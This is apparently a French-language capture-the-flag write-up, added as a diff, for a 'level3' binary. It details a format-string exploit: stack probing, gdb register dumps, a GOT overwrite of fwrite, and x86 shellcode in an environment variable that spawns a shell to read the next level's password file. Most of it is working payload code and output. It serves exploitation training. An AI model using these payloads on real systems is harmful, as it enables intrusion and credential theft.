@@ -1,0 +1,194 @@
+- Apres analyse du code asm, on se rend compte que le 1er argument de printf est celui recuperer avec
+fgets, ce qui le rend vulerable.
+- On va réécrire une variablle en 0x0804988c et la mettre a 0x40 afin de rentrer dans la condition
+qui contient un fwrite
+- On modifier aussi la gpt pour que le fwrite aille pointer dans un shellcode mit dans l'env
+
+1) On explorer la stack :
+
+	(python -c 'print "A" * 4 + "B" * 4 + "%p." * 10') | ./level3
+
+	=> 4 et 5 eme argument pour AAAA et BBBB
+
+2) La 1ere étape de m'exploit sera de ce genre : 
+
+(python -c 'print "\x8c\x98\x04\x08" + "\x8e\x98\x04\x08" + "%p%p%p%p%p" + "%40x%4$hn%0x%5$hn"') > /tmp/test3
+
+3) Correction 1er exposant
+
+gdb ./level3
+r < /tmp/test3
+(gdb) x 0x0804988c
+0x804988c <m>:  0x000000000063005b
+(gdb) i r
+eax            0x63005b 6488155
+ecx            0x0      0
+edx            0x0      0
+ebx            0xb7fd0ff4       -1208152076
+esp            0xbffff440       0xbffff440
+ebp            0xbffff658       0xbffff658
+esi            0x0      0
+edi            0x0      0
+eip            0x80484df        0x80484df <v+59>
+eflags         0x200282 [ SF IF ID ]
+cs             0x73     115
+ss             0x7b     123
+ds             0x7b     123
+es             0x7b     123
+fs             0x0      0
+gs             0x33     51
+
+Dans eax :
+
+=> 0x5b - 0x40 = 0x1b =====> on retire 27
+
+=> 13
+
+4) Correction 2eme exposant :
+
+Breakpoint 2, 0x080484df in v ()
+(gdb) i r
+eax            0x480040 4718656
+ecx            0x0      0
+edx            0x0      0
+ebx            0xb7fd0ff4       -1208152076
+esp            0xbffff440       0xbffff440
+ebp            0xbffff658       0xbffff658
+esi            0x0      0
+edi            0x0      0
+eip            0x80484df        0x80484df <v+59>
+eflags         0x200282 [ SF IF ID ]
+cs             0x73     115
+ss             0x7b     123
+ds             0x7b     123
+es             0x7b     123
+fs             0x0      0
+gs             0x33     51
+
+Dans eax :
+
+0xffff - 0x48 = 0xffb7 ===> 65463
+
+5) Verif de l'injection :
+
+Breakpoint 2, 0x080484df in v ()
+(gdb) i r
+eax            0xfff70040       -589760
+ecx            0x0      0
+edx            0x0      0
+ebx            0xb7fd0ff4       -1208152076
+esp            0xbffff440       0xbffff440
+ebp            0xbffff658       0xbffff658
+esi            0x0      0
+edi            0x0      0
+eip            0x80484df        0x80484df <v+59>
+eflags         0x200282 [ SF IF ID ]
+cs             0x73     115
+ss             0x7b     123
+ds             0x7b     123
+es             0x7b     123
+fs             0x0      0
+gs             0x33     51
+
+Dans eax :
+
+0xfff7 + 0x9 = 0x0000 
+
+==> 65472
+
+=> Ok
+
+6) On explore a nouveau la stack pour la 2eme réécriture :
+
+	(python -c 'print "A" * 4 + "B" * 4 + "C" * 4 + "D" * 4 + "%p." * 10') | ./level3 
+
+	==> 6 et 7 eme arguments pour C et D
+
+7) On regarde a quel endroit se trouve fwrite
+
+	objdump -R ./level3
+
+./level3:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+0804982c R_386_JUMP_SLOT   fwrite
+
+8) L'exploit est modifier dans en cette forme :
+
+(python -c 'print "\x8c\x98\x04\x08" + "\x8e\x98\x04\x08" + "\x2c\x98\x04\x08" + "\x30\x98\x04\x08" + "%p%p%p%p%p%p%p" + "%13x%4$hn%65472x%5$hn" + "%13x%4$hn%65472x%5$hn"' ) > /tmp/test3
+
+
+9) On regarde ou se trouve le shellcode :
+
+gdb ./level3
+break *0x80484df
+r < /tmp/test4
+x/1024xg $esp
+
+0xbffffe50:     0x2f726573752f656d      0x4c00336c6576656c
+0xbffffe60:     0x555f6e653d474e41      0x00382d4654552e53
+0xbffffe70:     0x9090903d4f544f54      0x9090909090909090
+0xbffffe80:     0x9090909090909090      0x9090909090909090
+0xbffffe90:     0x9090909090909090      0x9090909090909090
+0xbffffea0:     0x9090909090909090      0x9090909090909090
+0xbffffeb0:     0x9090909090909090      0x9090909090909090
+0xbffffec0:     0x9090909090909090      0x9090909090909090
+0xbffffed0:     0x9090909090909090      0xc931db3158466a90
+0xbffffee0:     0x580b6a5f21eb80cd      0xe689632d68665299
+0xbffffef0:     0x2f6868732f2f6852      0x565752e3896e6962
+0xbfffff00:     0xffdae880cde18953      0x682f20746163ffff
+0xbfffff10:     0x726573752f656d6f      0x2f346c6576656c2f
+
+	=> shellcode => 0xbffffeb0
+
+10) On verifie la 1ere injection :
+
+Breakpoint 2, 0x080484df in v ()
+(gdb) i r
+eax            0x1a005a 1704026
+ecx            0x0      0
+edx            0x0      0
+ebx            0xb7fd0ff4       -1208152076
+esp            0xbffff440       0xbffff440
+ebp            0xbffff658       0xbffff658
+
+Dans eax :
+
+0xffff - 0x005a + 0x40 = 65509
+
+(Ici 0xffff car on va faire un tour du short)
+
+- On verif avec gdb
+
+Breakpoint 2, 0x080484df in v ()
+(gdb) i r
+eax            0x32     50
+ecx            0x0      0
+edx            0x0      0
+ebx            0xb7fd0ff4       -1208152076
+esp            0xbffff440       0xbffff440
+ebp            0xbffff658       0xbffff658
+esi            0x0      0
+edi            0x0      0
+
+Dans eax :
+
+=> 65509 + 14  ==> donne bien 0x40 dans EAX
+
+
+11) 2eme injection :
+
+On est en 0x0000 avec le dernier short ecrit donc :
+
+0xfeb0 ==> 65200
+
+0x1bfff - 0xfeb0 = 0xc14f ====> 49487
+
+
+- Exploit :
+
+export TOTO=`python -c 'print "\x90" * 100 + "\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\xeb\x21\x5f\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe6\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x57\x56\x53\x89\xe1\xcd\x80\xe8\xda\xff\xff\xffcat /home/user/level4/.pass; whoami; exit"'`
+
+ (python -c 'print "\x8c\x98\x04\x08" + "\x8e\x98\x04\x08" + "\x2c\x98\x04\x08" + "\x2e\x98\x04\x08" + "%p%p%p%p%p%p%p" + "%65523x%4$hn%65472x%5$hn" + "%65200x%6$hn%49487x%7$hn"') | ./level3
+
